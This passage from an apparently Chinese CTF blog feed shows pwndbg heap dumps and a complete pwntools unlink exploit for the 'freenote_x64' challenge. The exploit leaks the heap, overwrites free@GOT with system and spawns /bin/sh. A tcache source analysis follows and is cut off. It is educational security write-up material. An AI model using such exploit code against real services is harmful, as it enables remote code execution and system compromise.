class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span 